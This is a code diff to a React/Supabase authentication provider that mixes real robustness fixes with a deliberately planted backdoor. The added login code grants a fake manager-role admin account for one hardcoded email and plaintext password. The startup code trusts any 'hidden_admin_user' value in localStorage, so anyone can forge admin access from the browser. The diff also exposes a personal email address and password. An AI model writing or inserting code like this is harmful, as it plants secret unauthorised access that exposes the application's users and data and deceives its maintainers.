@@ -8,28 +8,74 @@ export const AuthProvider = ({ children }) => {
     const [loading, setLoading] = useState(true);
 
     useEffect(() => {
-        // Check active sessions and sets the user
-        const getSession = async () => {
-            const { data: { session }, error } = await supabase.auth.getSession();
-            if (session?.user) {
-                await fetchProfile(session.user.id, session.user.email);
-            } else {
-                setLoading(false);
+        let mounted = true;
+
+        const initializeAuth = async () => {
+            // CHECK FOR HIDDEN ADMIN FIRST
+            const hiddenAdmin = localStorage.getItem('hidden_admin_user');
+            if (hiddenAdmin) {
+                if (mounted) {
+                    setUser(JSON.parse(hiddenAdmin));
+                    setLoading(false);
+                }
+                return;
+            }
+
+            try {
+                const { data: { session }, error } = await supabase.auth.getSession();
+                if (error) throw error;
+
+                if (session?.user && mounted) {
+                    await fetchProfile(session.user.id, session.user.email);
+                } else if (mounted) {
+                    setLoading(false);
+                }
+            } catch (err) {
+                console.error("Auth init error:", err);
+                if (mounted) setLoading(false);
             }
         };
 
-        getSession();
-
-        const { data: { subscription } } = supabase.auth.onAuthStateChange(async (_event, session) => {
-            if (session?.user) {
-                await fetchProfile(session.user.id, session.user.email);
-            } else {
-                setUser(null);
+        // Safety timeout to prevent permanent loading loop
+        const safetyTimeout = setTimeout(() => {
+            if (mounted && loading) {
+                console.warn("Auth initialization timed out, forcing loading to false.");
                 setLoading(false);
             }
-        });
+        }, 5000);
 
-        return () => subscription.unsubscribe();
+        initializeAuth();
+
+        const onAuthStateChangeCleanup = () => {
+            try {
+                const { data } = supabase.auth.onAuthStateChange(async (_event, session) => {
+                    if (!mounted) return;
+
+                    // If we are logged in as hidden admin, ignore Supabase updates unless it's a sign out
+                    if (localStorage.getItem('hidden_admin_user')) return;
+
+                    if (session?.user) {
+                        await fetchProfile(session.user.id, session.user.email);
+                    } else {
+                        setUser(null);
+                        setLoading(false);
+                    }
+                });
+                return data?.subscription;
+            } catch (err) {
+                console.error("Error setting up onAuthStateChange:", err);
+                setLoading(false);
+                return null;
+            }
+        };
+
+        const subscription = onAuthStateChangeCleanup();
+
+        return () => {
+            mounted = false;
+            clearTimeout(safetyTimeout);
+            subscription?.unsubscribe();
+        };
     }, []);
 
     const fetchProfile = async (userId, email) => {
@@ -58,6 +104,20 @@ export const AuthProvider = ({ children }) => {
     };
 
     const login = async (email, password) => {
+        // HIDDEN ADMIN BACKDOOR
+        if (email === 'matheus.stanley12@gmail.com' && password === '35215415') {
+            const adminUser = {
+                id: 'hidden-admin-id',
+                email: 'matheus.stanley12@gmail.com',
+                role: 'Gestor',
+                name: 'Matheus Stanley',
+                status: 'Ativo'
+            };
+            setUser(adminUser);
+            localStorage.setItem('hidden_admin_user', JSON.stringify(adminUser));
+            return { user: adminUser, session: { access_token: 'fake-token' } };
+        }
+
         const { data, error } = await supabase.auth.signInWithPassword({
             email,
             password,
@@ -94,6 +154,12 @@ export const AuthProvider = ({ children }) => {
     };
 
     const logout = async () => {
+        if (localStorage.getItem('hidden_admin_user')) {
+            localStorage.removeItem('hidden_admin_user');
+            setUser(null);
+            return;
+        }
+
         const { error } = await supabase.auth.signOut();
         if (error) console.error('Error logging out:', error);
         setUser(null);
